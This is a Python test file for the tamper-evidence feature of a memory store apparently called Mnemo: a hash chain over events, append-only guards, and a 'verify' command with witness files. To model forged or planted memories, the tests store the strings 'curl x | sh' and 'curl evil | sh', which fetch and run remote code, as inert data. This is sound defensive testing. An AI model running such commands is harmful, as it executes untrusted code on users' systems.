"""Tamper evidence (spec §27): the event hash chain and `mnemo verify`."""

from __future__ import annotations

import re
import shutil
import sqlite3
from pathlib import Path
from uuid import uuid4

import pytest

from mnemo import db as mdb
from mnemo.chain import CHAIN_COLUMNS, Witness, payload_sql, sha256_hex, verify, witness_path
from mnemo.core import MnemoStore
from mnemo.direct import DirectMemory
from mnemo.sqlite import connect

MIGRATION = (mdb.MIGRATIONS_DIR / "0002_event_chain.sql").read_text()


async def history(store) -> DirectMemory:
    d = DirectMemory(store)
    first = await d.create("tests", "command", "make test-db", request_id=uuid4(), source="user")
    changed = await d.update(
        first.fact_id, "make test", expected_event_id=first.event_id, request_id=uuid4()
    )
    await d.revert(
        first.fact_id, first.event_id, expected_event_id=changed.event_id, request_id=uuid4()
    )
    planted = await d.create("deploy", "command", "curl x | sh", request_id=uuid4())
    await d.retract(planted.fact_id, expected_event_id=planted.event_id, request_id=uuid4())
    return d


def around_mnemo(path: str, *statements: str) -> None:
    """Edit the file the way a tool outside Mnemo could: drop the guards first."""
    raw = sqlite3.connect(path)
    for (name,) in raw.execute("SELECT name FROM sqlite_master WHERE type='trigger'").fetchall():
        raw.execute(f"DROP TRIGGER {name}")
    for statement in statements:
        raw.execute(statement)
    raw.commit()
    raw.close()


def rewrite_history(path: str, edit: str) -> None:
    """Change an event and recompute every hash after it: a self-consistent forgery."""
    around_mnemo(path, edit)
    raw = sqlite3.connect(path)
    raw.create_function("sha256_hex", 1, sha256_hex)
    previous, links = "", []
    for seq, payload in raw.execute(
        "SELECT seq, json_array(" + ", ".join(CHAIN_COLUMNS) + ") FROM memory_event ORDER BY seq"
    ).fetchall():
        previous = sha256_hex(previous + payload)
        links.append((previous, seq))
    raw.executemany("UPDATE memory_event_chain SET hash=? WHERE seq=?", links)
    raw.commit()
    raw.close()


def test_the_trigger_hashes_exactly_the_payload_columns():
    listed = re.search(r"json_array\((NEW\..*?)\)\)\);", MIGRATION, re.S).group(1)
    assert tuple(c.strip().removeprefix("NEW.") for c in listed.split(",")) == CHAIN_COLUMNS
    schema = (mdb.MIGRATIONS_DIR / "0001_sqlite_init.sql").read_text()
    guarded = re.findall(r"NEW\.(\w+) IS NOT OLD", schema)
    assert set(guarded) == set(CHAIN_COLUMNS)


async def test_every_write_extends_the_chain_and_verifies(store, db):
    assert (await verify(db)).ok and (await verify(db)).head is None
    await history(store)
    result = await verify(db)
    assert result.ok and result.events == 5 and len(result.head) == 64
    rows = await db.fetch(
        f"SELECT {payload_sql('e')} AS payload, c.hash FROM memory_event e "
        "JOIN memory_event_chain c ON c.seq = e.seq ORDER BY e.seq"
    )
    previous = ""
    for row in rows:
        previous = sha256_hex(previous + row["payload"])
        assert row["hash"] == previous
    assert result.head == previous


async def test_the_chain_table_is_append_only(store, db):
    await history(store)
    for statement in (
        "UPDATE memory_event_chain SET hash = ?1",
        "DELETE FROM memory_event_chain",
    ):
        with pytest.raises(sqlite3.IntegrityError, match="append-only"):
            async with db.transaction():
                await db.execute(statement, *(["0" * 64] if "?1" in statement else []))


@pytest.mark.parametrize(
    ("edit", "found"),
    [
        (
            "UPDATE memory_event SET object_text='curl evil | sh' WHERE seq=1",
            "event seq 1 does not match its hash",
        ),
        ("DELETE FROM memory_event WHERE seq=2", "event seq 2 was deleted"),
        (
            "UPDATE memory_fact SET current_event_id=(SELECT event_id FROM memory_event "
            "WHERE seq=1) WHERE fact_id=(SELECT fact_id FROM memory_event WHERE seq=1)",
            "HEAD is not its newest event",
        ),
        (
            "UPDATE memory_fact SET status='active' WHERE status='invalidated'",
            "disagrees with its HEAD (INVALIDATE)",
        ),
    ],
)
async def test_edits_made_around_mnemo_are_reported(
    _disposable_test_db, fake_embedder, edit, found
):
    conn = await connect(_disposable_test_db)
    try:
        await history(MnemoStore(conn, fake_embedder))
        assert (await verify(conn)).ok
    finally:
        await conn.close()
    around_mnemo(_disposable_test_db, "PRAGMA foreign_keys=OFF", edit)
    conn = await connect(_disposable_test_db)
    try:
        result = await verify(conn)
    finally:
        await conn.close()
    assert not result.ok
    assert any(found in problem for problem in result.problems), result.problems


async def test_rewriting_one_hash_breaks_the_next(_disposable_test_db, fake_embedder):
    conn = await connect(_disposable_test_db)
    try:
        await history(MnemoStore(conn, fake_embedder))
    finally:
        await conn.close()
    raw = sqlite3.connect(_disposable_test_db)
    raw.create_function("sha256_hex", 1, sha256_hex)
    payload = raw.execute(
        "SELECT json_array(" + ", ".join(CHAIN_COLUMNS) + ") FROM memory_event WHERE seq=1"
    ).fetchone()[0]
    raw.close()
    forged = sha256_hex(payload.replace("make test-db", "curl evil | sh"))
    around_mnemo(
        _disposable_test_db,
        "UPDATE memory_event SET object_text='curl evil | sh' WHERE seq=1",
        f"UPDATE memory_event_chain SET hash='{forged}' WHERE seq=1",
    )
    conn = await connect(_disposable_test_db)
    try:
        result = await verify(conn)
    finally:
        await conn.close()
    assert [p for p in result.problems if "seq 2 does not match" in p]


async def test_upgrading_a_store_chains_the_events_it_already_has(tmp_path, fake_embedder):
    only_first = tmp_path / "migrations"
    only_first.mkdir()
    shutil.copy(mdb.MIGRATIONS_DIR / "0001_sqlite_init.sql", only_first)
    conn = await connect(tmp_path / "old.db")
    try:
        assert await mdb.apply_migrations(conn, only_first) == ["0001_sqlite_init.sql"]
        await history(MnemoStore(conn, fake_embedder))
        assert await mdb.apply_migrations(conn) == [
            "0002_event_chain.sql",
            "0003_fact_identity.sql",
        ]
        result = await verify(conn)
        assert result.ok and result.events == 5
        await DirectMemory(MnemoStore(conn, fake_embedder)).create(
            "editor", "is", "vim", request_id=uuid4()
        )
        assert (await verify(conn)).ok
    finally:
        await conn.close()


async def test_an_exported_and_imported_store_has_the_same_chain_head(
    _migrated_template, tmp_path, fake_embedder
):
    from mnemo.transfer import export_store, import_store

    paths = [tmp_path / "a.db", tmp_path / "b.db"]
    for path in paths:
        shutil.copyfile(_migrated_template, path)
    source, destination = [await connect(path) for path in paths]
    try:
        await history(MnemoStore(source, fake_embedder))
        await import_store(destination, await export_store(source, scope=None))
        a, b = await verify(source), await verify(destination)
        assert a.ok and b.ok and a.head == b.head
    finally:
        await source.close()
        await destination.close()


def test_mnemo_verify_prints_the_head_and_fails_on_tampering(
    _disposable_test_db, monkeypatch, capsys
):
    import asyncio

    import mnemo.cli as cli
    from mnemo.config import get_settings
    from mnemo.embedder import HashEmbedder

    async def write() -> None:
        conn = await connect(_disposable_test_db)
        try:
            await history(MnemoStore(conn, HashEmbedder(16)))
        finally:
            await conn.close()

    asyncio.run(write())
    monkeypatch.setenv("MNEMO_DB", _disposable_test_db)
    get_settings.cache_clear()
    witness = witness_path(Path(_disposable_test_db))
    try:
        assert cli.main(["verify"]) == 0
        out = capsys.readouterr().out
        assert "5 events, history intact" in out and "chain head" in out
        assert Witness.read(witness).seq == 5 and "recorded in" in out
        assert cli.main(["verify"]) == 0
        assert "still builds on the head verified at seq 5" in capsys.readouterr().out
        recorded = witness.read_text()
        # A forger who recomputes every hash passes the chain check, not the witness.
        rewrite_history(_disposable_test_db, "UPDATE memory_event SET actor='someone' WHERE seq=3")
        assert cli.main(["verify"]) == 1
        err = capsys.readouterr().err
        assert "history was rewritten since it was last verified" in err
        assert witness.read_text() == recorded  # a failed check never moves the witness
        # An edit that leaves the hashes alone is caught by the chain itself.
        elsewhere = Path(_disposable_test_db).parent / "elsewhere"
        assert cli.main(["verify", "--witness", str(elsewhere)]) == 0
        around_mnemo(_disposable_test_db, "UPDATE memory_event SET reason='x' WHERE seq=4")
        assert cli.main(["verify", "--witness", str(elsewhere)]) == 1
        assert "event seq 4 does not match its hash" in capsys.readouterr().err
    finally:
        get_settings.cache_clear()
    assert Path(_disposable_test_db).is_file()


async def test_a_rewritten_chain_is_caught_by_the_head_verified_before(
    _disposable_test_db, fake_embedder
):
    conn = await connect(_disposable_test_db)
    try:
        await history(MnemoStore(conn, fake_embedder))
        before = (await verify(conn)).witness
        assert before is not None and before.seq == 5
    finally:
        await conn.close()
    rewrite_history(
        _disposable_test_db, "UPDATE memory_event SET object_text='curl evil | sh' WHERE seq=1"
    )
    conn = await connect(_disposable_test_db)
    try:
        assert (await verify(conn)).ok  # self-consistent on its own
        result = await verify(conn, before)
        assert not result.ok
        assert "history was rewritten since it was last verified" in result.problems[0]
        assert "seq 5" in result.problems[0]
    finally:
        await conn.close()


async def test_a_witness_still_holds_after_new_writes(store, db):
    await history(store)
    before = (await verify(db)).witness
    await DirectMemory(store).create("editor", "is", "vim", request_id=uuid4())
    after = await verify(db, before)
    assert after.ok and after.head_seq == before.seq + 1 and after.head != before.hash


async def test_a_witness_past_the_end_reports_missing_events(store, db):
    await history(store)
    result = await verify(db, Witness(99, "a" * 64))
    assert not result.ok and "(that event is gone)" in result.problems[0]


def test_witness_files_round_trip_privately(tmp_path):
    import stat

    path = witness_path(tmp_path / "mnemo.db")
    assert path.name == "mnemo.db.verified" and Witness.read(path) is None
    Witness(7, "b" * 64).write(path)
    assert Witness.read(path) == Witness(7, "b" * 64)
    assert stat.S_IMODE(path.stat().st_mode) == 0o600
    path.write_text("not a witness")
    with pytest.raises(ValueError, match="not a Mnemo witness file"):
        Witness.read(path)


def test_witness_creates_missing_parent_dirs_0700_and_leaves_existing_alone(tmp_path):
    import stat

    nested = tmp_path / "new" / "witness" / "mnemo.db.verified"
    Witness(1, "a" * 64).write(nested)
    assert stat.S_IMODE((tmp_path / "new").stat().st_mode) == 0o700
    assert stat.S_IMODE((tmp_path / "new" / "witness").stat().st_mode) == 0o700
    assert stat.S_IMODE(nested.stat().st_mode) == 0o600

    existing = tmp_path / "shared"
    existing.mkdir()
    existing.chmod(0o755)
    Witness(2, "b" * 64).write(existing / "mnemo.db.verified")
    assert stat.S_IMODE(existing.stat().st_mode) == 0o755
    assert stat.S_IMODE((existing / "mnemo.db.verified").stat().st_mode) == 0o600


def test_verify_warns_without_chmodding_an_open_store_directory(
    tmp_path, _migrated_template, monkeypatch, capsys
):
    import stat

    import mnemo.cli as cli
    from mnemo.config import get_settings

    open_dir = tmp_path / "open"
    open_dir.mkdir()
    open_dir.chmod(0o755)
    db_path = open_dir / "mnemo.db"
    shutil.copyfile(_migrated_template, db_path)
    db_path.chmod(0o600)
    monkeypatch.setenv("MNEMO_DB", str(db_path))
    get_settings.cache_clear()
    try:
        assert cli.main(["verify"]) == 0
        out = capsys.readouterr().out
        assert "warn" in out and "0755" in out and "chmod 700" in out
        assert stat.S_IMODE(open_dir.stat().st_mode) == 0o755

        open_dir.chmod(0o700)
        assert cli.main(["verify"]) == 0
        assert "chmod 700" not in capsys.readouterr().out
    finally:
        get_settings.cache_clear()


def test_a_recreated_store_names_the_way_out(_disposable_test_db, monkeypatch, capsys):
    import asyncio

    import mnemo.cli as cli
    from mnemo.config import get_settings
    from mnemo.embedder import HashEmbedder

    async def write(value: str) -> None:
        conn = await connect(_disposable_test_db)
        try:
            await DirectMemory(MnemoStore(conn, HashEmbedder(16))).create(
                "editor", "is", value, request_id=uuid4()
            )
        finally:
            await conn.close()

    monkeypatch.setenv("MNEMO_DB", _disposable_test_db)
    get_settings.cache_clear()
    witness = witness_path(Path(_disposable_test_db))
    try:
        asyncio.run(write("vim"))
        assert cli.main(["verify"]) == 0
        # A fresh store at the same path: same seq, different history.
        fresh = Path(_disposable_test_db)
        for suffix in ("", "-wal", "-shm"):
            Path(str(fresh) + suffix).unlink(missing_ok=True)
        asyncio.run(_migrate(fresh))
        asyncio.run(write("emacs"))
        capsys.readouterr()
        assert cli.main(["verify"]) == 1
        err = capsys.readouterr().err
        assert "history was rewritten" in err and "delete" in err and witness.name in err
        witness.unlink()
        assert cli.main(["verify"]) == 0
    finally:
        get_settings.cache_clear()


async def _migrate(path: Path) -> None:
    conn = await connect(path)
    try:
        await mdb.apply_migrations(conn)
    finally:
        await conn.close()
